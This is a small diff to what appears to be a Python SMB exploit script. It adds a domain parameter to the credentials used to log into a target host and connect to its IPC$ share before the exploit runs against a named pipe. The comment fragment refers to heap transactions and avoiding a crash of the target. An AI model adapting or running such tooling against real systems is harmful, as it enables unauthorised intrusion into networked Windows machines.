@@ -20,8 +20,9 @@ same page as allocated transaction. Moreover, if the written address is not our 
 free chunk data (failed but not crash the target).
 '''
 
-USERNAME = ''
-PASSWORD = ''
+USERNAME = ''		#Edit username
+PASSWORD = ''		#Edit password
+DOMAIN = ''		#Edit domain
 
 if len(sys.argv) != 3:
 	print("{} <ip> <pipe_name>".format(sys.argv[0]))
@@ -31,7 +32,7 @@ target = sys.argv[1]
 pipe_name = sys.argv[2]
 
 conn = MYSMB(target)
-conn.login(USERNAME, PASSWORD)
+conn.login(USERNAME, PASSWORD, DOMAIN)
 
 tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 conn.set_default_tid(tid)
